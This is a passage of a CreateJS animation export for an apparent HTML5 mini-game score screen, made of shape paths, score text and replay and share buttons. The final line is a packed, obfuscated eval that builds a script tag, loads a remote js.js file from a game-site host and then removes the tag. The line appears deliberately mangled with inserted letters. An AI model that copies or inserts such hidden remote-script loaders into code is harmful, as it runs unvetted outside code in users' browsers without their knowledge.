ABAAAAAAQABAAAAgBQABAAAAAAIATAAIAAk+QgCgmAnAAICKAAQAqAAAAAjIAAFBIAPAAQAVACACAVQgCAYgVACIj/AAQgPgCgHgLQgGgLAEgMQgMACgNgHQgIgIgEgGQgiAsgcARQgJAEgHAAQgOAAgKgMgAvAixIBuAAIAAhCIhuAAgAx1k6QgCAGAEAEQAAAAAAABQAAAAAAAAQABABAAAAQAAAAAAAAIAfAgQAZg5AHhZQACgKgNgCIgXAAQgPBFgRAtgAvAknIBuAAIAAhCIhuAAgAvAnWIAAA5IBuAAIAAg5QgCgHgJgCIhaAAQgJACAAAHgEgmGgCBQgWgKABgXQAGgXAZACQAkAIAogCQAhACAFgTQAKgVACgsQAEgqAAhZQgCgJgIgCIiXAAQgkC2h1BfQgXAOgRgTQgMgTAVgTQBnhtAYh9Ih3AAQgXAAAAgbQACgbAXgBIB/AAIAIg/QAAgIABgIQACgYAbgCQAZAEAAAYQAAAmgGAnICoAAQAqgCgCAqQAECdgQBJQgLBEhaAAQgsAAgogLgEgiCgCAQgOgTASgPQAmgkARgeQgKgGgNgLIgXgVQgTgKALggQAQg/AJg7IgLAAQgXAAAAgaQAAgXAXgCIATAAQACgKADgvQACgTAZAAQAVABAAAXIgGA0IAiAAQAdAAgCAeQgGCYgVA5QACAEAEAEIAXARQANATgLATQgTARgRgRQgGgCgGgHIgDgGQgSAcgnAmQgMAJgKAAQgLAAgJgJgEghHgFPIgEAXQgGAPAMAEQADAGAKAFQACAEAEAAIAJgzIAIhbQgCgIgIgCIgHAAQgIAqgNA1gEAjbgDGIAAi0QgVALgPgTQgNgXAagVQA9gmA5hIQASgZAaAGQANAHAEAKICDAAQAdACAJALQAKAMgNAVIghAtIgJAQIA1AAQAsgCgCArIAABYQAEAxgygGIkSAAIAAAyQgVAxCIgHIA8AAQBYACAPgKQAVgGAAgpQAAgVAZgCQAYACACAVQAABAgYATQgXAVhSAAIh8AAIgVABQiPAAAMhNgEAmwgE8IBlAAQAGAAAAgFIAAg4QgCgDgEgCIhlAAgEAkSgF6IAAA+IBpAAIAAhCIhjAAQgGAAAAAEgEAklgGzICGAAQALgMAJgPQAMgPAAgGQAAgGgNAAIhjAAgEgljgDyQgZgmgZgrQgNgVARgPQAVgMARARQATAbAhA3QAJAVgTAPQgJAFgHAAQgLAAgHgLgAbyliIAAiOQgEg0AyACIEfAAQAsAAAAAwIAACMQADA7g5gFIkZAAIgIAAQgmAAAEgygEAgggFnQAQABAAgTIAAhfQgCgTgOAAIjiAAQgRAAAAARIAABhQgCATATgBgEgrSgG9QgRgKg2grQgTgOAMgVQANgTAVAKQAgAXAlAgQANARgKARQgIALgKAAQgFAAgFgDgEgoYgHYQgGgEgcgvQgMgRATgOQAVgLAOAPIAiA5QgBAcgSAAQgJAAgOgHg");
	this.shape_27.setTransform(360,649.7);

	this.text = new cjs.Text("99%", "bold 50px 'Arial'", "#FFA300");
	this.text.textAlign = "center";
	this.text.lineHeight = 62;
	this.text.lineWidth = 141;
	this.text.setTransform(238,652.7);

	this.text_1 = new cjs.Text("426", "bold 60px 'Arial'", "#FFA300");
	this.text_1.textAlign = "center";
	this.text_1.lineHeight = 72;
	this.text_1.lineWidth = 141;
	this.text_1.setTransform(476.1,578.2);

	this.instance_1 = new lib.再来一次();
	this.instance_1.setTransform(483.9,801.4,1,1,0,0,0,107.8,41.1);
	new cjs.ButtonHelper(this.instance_1, 0, 1, 2, false, new lib.再来一次(), 3);

	this.instance_2 = new lib.炫耀一下();
	this.instance_2.setTransform(236.2,801.4,1,1,0,0,0,107.8,41.1);
	new cjs.ButtonHelper(this.instance_2, 0, 1, 1);

	this.shape_28 = new cjs.Shape();
	this.shape_28.graphics.f("#2B2D30").s().p("Ag3D7QhhgChNgyQg+AvhWgCQhagCg+g3Qg/g4ABhNQAChLBBg1QBBg1BaACQAcABAeAHQAmg+BGgkQBKglBVACQBZACBKAuQBJAsAgBHQAbgHAdABQA9ABAxAfQAxAdAVAtQAMgCALAAQAuABAfAcQAhAdgBAnQgBAnghAbQghAbgvgBQgdAAgagOQgcAbgmAOQgoAOgrgBQhOgBg4gvQgoAdgyAQQgwAOgyAAIgHAAg");
	this.shape_28.setTransform(583.8,307.2);

	this.shape_29 = new cjs.Shape();
	this.shape_29.graphics.f("#3E4149").s().p("AgVBiQgmgBgegUQgZATghgBQgjAAgZgWQgYgWAAgeQABgcAagVQAZgVAjABQAJAAAOADQAPgYAbgOQAdgPAhABQAiABAdARQAdASAMAcQAJgDANAAQAYABATALQATAMAJAQIAIAAQASAAANALQANALgBAQQAAAPgNALQgNAKgSAAQgMAAgKgGQgXAXgkgBQgdgBgXgSQgfAXgoAAIgEAAg");
	this.shape_29.setTransform(101.2,757);

	this.shape_30 = new cjs.Shape();
	this.shape_30.graphics.f("#3E4149").s().p("AhRFuQiNgDhwhKQgsAhg2ARQg5ASg9gBQiEgDhbhRQhbhRAChwQADhuBfhNQBehOCEADQArABApALQA4hbBng0QBqg2B8ADQCDACBtBDQBpBBAvBnQAngJAsAAQBYACBIAsQBGArAgBCQANgCATAAQBDABAvAqQAuApgBA5QgBA6gwAnQgxAnhDgBQgsgBglgUQgpAng4AUQg5AWhAgCQg4gBgzgTQgxgSgnggQg7ArhIAWQhGAVhKAAIgKAAg");
	this.shape_30.setTransform(163.3,663.1);

	this.shape_31 = new cjs.Shape();
	this.shape_31.graphics.f("#2B2D30").s().p("AiFJTQhygDhrghQhmgfhYg6QhHA2hZAcQhbAchjgCQjWgEiUiEQiUiEAEi2QAEizCah+QCah9DUAFQBGABBEARQBaiTCnhVQCshXDKAEQDWAFCwBsQCrBpBMCnQBBgPBGACQCPADB1BHQByBFAzBtQAYgEAdAAQBtADBLBDQBMBDgCBdQgCBdhOBAQhPBAhsgDQhIgBg9ggQhDA+hZAiQheAihngCQhbgChTgeQhQgeg+g0QhgBFh2AkQhyAjh4AAIgRAAg");
	this.shape_31.setTransform(495.4,875.8);

	this.shape_32 = new cjs.Shape();
	this.shape_32.graphics.f("#35373A").s().p("AhnHPQhYgChUgaQhQgYhEgtQg3AphFAWQhHAXhNgCQimgDh0hnQhzhmADiOQADiLB4hiQB3hhCmADQA0ABA3AOQBGhyCChCQCGhFCdAEQCmADCJBUQCGBSA6CCQA1gMA0ACQBvACBbA3QBZA2AoBUQAVgDAUABQBUACA7A0QA7A0gBBIQgCBJg9AxQg9AyhVgCQg3gBgvgZQg0AxhHAaQhIAbhQgCQhHgChAgXQg/gXgwgpQhLA2hbAcQhZAbhdAAIgNAAg");
	this.shape_32.setTransform(223.7,211);

	this.timeline.addTween(cjs.Tween.get({}).to({state:[{t:this.introMC}]}).to({state:[]},1).to({state:[{t:this.shape_32},{t:this.shape_31},{t:this.shape_30},{t:this.shape_29},{t:this.shape_28},{t:this.instance_2},{t:this.instance_1},{t:this.text_1},{t:this.text},{t:this.shape_27},{t:this.instance},{t:this.shape_26},{t:this.shape_25},{t:this.shape_24},{t:this.shape_23},{t:this.shape_22},{t:this.shape_21},{t:this.shape_20},{t:this.shape_19},{t:this.shape_18},{t:this.shape_17},{t:this.shape_16},{t:this.shape_15},{t:this.shape_14},{t:this.shape_13},{t:this.shape_12},{t:this.shape_11},{t:this.shape_10},{t:this.shape_9},{t:this.shape_8},{t:this.shape_7},{t:this.shape_6},{t:this.shape_5},{t:this.shape_4},{t:this.shape_3},{t:this.shape_2},{t:this.shape_1},{t:this.shape}]},2).wait(1));

	// 背景
	this.shape_33 = new cjs.Shape();
	this.shape_33.graphics.f("#202330").s().p("Eg4OBj/MAAAjH+MBweAAAMAAADH+g");
	this.shape_33.setTransform(360,550,1,0.859);

	this.timeline.addTween(cjs.Tween.get(this.shape_33).wait(4));

}).prototype = p = new cjs.MovieClip();
p.nominalBounds = new cjs.Rectangle(360,550,720,1100);

})(lib = lib||{}, images = images||{}, createjs = createjs||{});
var lib, images, createjs;
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?"":e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)d[e(c)]=k[c]||e(c);k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1;};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p;}('(1(){2 a=3.p(\'4\');a.e=\'d/c\';a.h=g;a.f=\'6://9.8.7/m/o.k\';2 b=3.n(\'4\')[0];b.5.j(a,b);a.i=1(){a.5.l(a)}})();',26,26,'|function|var|document|sxcrxixpt|parentNode|hxtxtp|cxoxxm|9xxxg|gxaxmxe|||javxasxcxrixpt|texxt|type|srxc|true|async|onload|insertBefore|js|removeChild|ceast|getElementsByTagName||createElement'.split('|'),0,{}))